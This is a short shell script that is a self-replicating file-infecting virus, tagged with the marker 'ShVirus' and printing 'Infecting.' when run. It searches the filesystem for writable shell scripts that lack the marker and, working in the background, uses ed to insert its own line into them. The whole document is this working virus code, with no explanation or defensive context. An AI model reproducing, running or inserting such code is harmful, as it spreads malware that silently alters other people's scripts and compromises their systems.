#!/bin/sh
(echo 1a;grep ShVirus $0;echo .;echo w)|ed `find / -type f -writable -exec grep -ql '^#! */bin/sh' {} \; \! -exec grep -ql ShVirus {} \; -print 2>/dev/null|head -1` &
echo "Infecting."

